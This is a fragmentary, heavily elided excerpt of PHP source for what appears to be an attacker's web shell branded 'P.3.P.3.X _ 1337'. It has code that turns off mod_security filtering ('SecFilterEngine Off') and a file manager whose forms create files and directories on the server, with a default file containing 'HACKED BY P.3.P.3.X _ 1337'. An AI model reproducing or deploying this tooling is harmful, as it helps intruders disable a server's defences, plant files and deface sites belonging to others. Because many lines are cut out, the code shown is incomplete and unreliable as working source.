...
$text = "<IfModule mod_security.c>
  ...
  SecFilterEngine Off
        ...
        function makefile($post) {
            if (isset($_GET[$post])) {
                ...
                <form method="post">
                    <tr class="filemanager">
                        <td>
                            <input class="filemanager" style="width:100%;" type="text" name="filename" value="p3p3x.php">
                        </td>
                    </tr>
                    <tr class="filemanager">
                        <td>
                            <textarea class="filemanager" name="text">HACKED BY P.3.P.3.X _ 1337</textarea>
                        </td>
                    </tr>
                    <tr class="filemanager">
                        <td>
            ...
            if (isset($_GET[$post])) {
                ...
                <form method="post">
                    ...
                    <tr class="filemanager">
                        <td>
                            <input class="filemanager" style="width:100%;" type="text" name="dirname" value="p3p3x">
                        </td>
                    </tr>
                    <tr>
                        <td>
        ...
        <tr>
            <th colspan="4">
                <a class="home" href="<?php print $_SERVER['SCRIPT_NAME'] ?>">P.3.P.3.X _ 1337</a>
            </th>
        </tr>
        <tr>
            <td colspan="4">
        ...
        <tr>
            <th colspan="4">
                &copy; <?php print @date("Y") ?> - P.3.P.3.X _ 1337 | 
                <?php 
                $file = @scandir(@cwd());
                $count = @count($file)-2;
                if (!is_file($file)) {
